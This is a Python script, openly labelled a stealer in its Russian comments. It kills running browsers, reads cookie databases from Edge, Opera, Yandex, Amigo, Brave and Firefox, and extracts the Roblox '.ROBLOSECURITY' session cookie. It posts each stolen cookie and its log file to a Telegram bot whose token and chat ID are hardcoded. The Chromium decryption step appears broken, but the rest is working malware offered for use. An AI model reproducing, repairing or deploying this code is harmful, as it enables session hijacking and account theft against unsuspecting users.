import os
import sqlite3
import json
import requests
import logging
import subprocess
from shutil import copy2
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Конфигурация
TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
CHAT_ID = "1962231620"       # Замените на реальный Chat ID
LOG_FILE = "stiller.log"      # Файл логов

# Настройка логов
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def kill_browsers():
    """Принудительно закрывает все целевые браузеры"""
    browsers = [
        "msedge.exe", "opera.exe", "browser.exe", 
        "amigo.exe", "brave.exe", "firefox.exe"
    ]
    for browser in browsers:
        subprocess.call(f"taskkill /f /im {browser}", shell=True)

def decrypt_cookie(cookie, key):
    try:
        iv = cookie[3:15]
        payload = cookie[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(payload)[:-16].decode()
    except:
        return None

def get_chromium_cookies(browser_path):
    cookies = []
    try:
        # Копирование файлов
        temp_cookie = os.path.join(os.getenv("TEMP"), "temp_cookie")
        temp_local_state = os.path.join(os.getenv("TEMP"), "temp_local_state")
        copy2(os.path.join(browser_path, "Network", "Cookies"), temp_cookie)
        copy2(os.path.join(browser_path, "Local State"), temp_local_state)

        # Расшифровка ключа
        with open(temp_local_state, "r") as f:
            key = json.load(f)["os_crypt"]["encrypted_key"]
        key = default_backend().decrypt(key[5:], None)[:32]

        # Поиск куки
        conn = sqlite3.connect(temp_cookie)
        cursor = conn.cursor()
        cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'")
        for name, encrypted_val in cursor.fetchall():
            decrypted = decrypt_cookie(encrypted_val, key)
            if decrypted: 
                cookies.append(decrypted)
                logging.info(f"Найдена кука в {os.path.basename(browser_path)}: {decrypted[:15]}...")

        conn.close()
        os.remove(temp_cookie)
        os.remove(temp_local_state)
    except Exception as e:
        logging.error(f"Ошибка в {browser_path}: {str(e)}")
    return cookies

def get_firefox_cookies(path):
    try:
        # Копирование файла
        temp_db = os.path.join(os.getenv("TEMP"), "temp_cookies.sqlite")
        copy2(os.path.join(path, "cookies.sqlite"), temp_db)

        # Поиск куки
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM moz_cookies WHERE host='.roblox.com' AND name='.ROBLOSECURITY'")
        cookies = [row[0] for row in cursor.fetchall()]
        for cookie in cookies:
            logging.info(f"Найдена кука в Firefox: {cookie[:15]}...")
        conn.close()
        os.remove(temp_db)
        return cookies
    except Exception as e:
        logging.error(f"Ошибка Firefox: {str(e)}")
        return []

def send_to_telegram(text, is_file=False):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/"
    if is_file:
        files = {"document": open(text, "rb")}
        requests.post(url + "sendDocument", data={"chat_id": CHAT_ID}, files=files)
    else:
        data = {"chat_id": CHAT_ID, "text": text}
        requests.post(url + "sendMessage", data=data)

def main():
    kill_browsers()  # Закрываем браузеры перед стартом
    logging.info("===== Запуск стиллера =====")

    browsers = {
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
        "Amigo": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }

    all_cookies = []
    for name, path in browsers.items():
        if "Firefox" in name:
            for profile in os.listdir(path):
                if profile.endswith(".default-release"):
                    all_cookies.extend(get_firefox_cookies(os.path.join(path, profile)))
        elif os.path.exists(path):
            all_cookies.extend(get_chromium_cookies(path))

    # Отправка результатов
    if all_cookies:
        for cookie in set(all_cookies):
            send_to_telegram(f"ROBLOSECURITY: {cookie}")
    else:
        logging.warning("Куки .ROBLOSECURITY не найдены")

    # Отправка логов
    send_to_telegram(LOG_FILE, is_file=True)
    logging.info("Логи отправлены в Telegram")

if __name__ == "__main__":
    main()
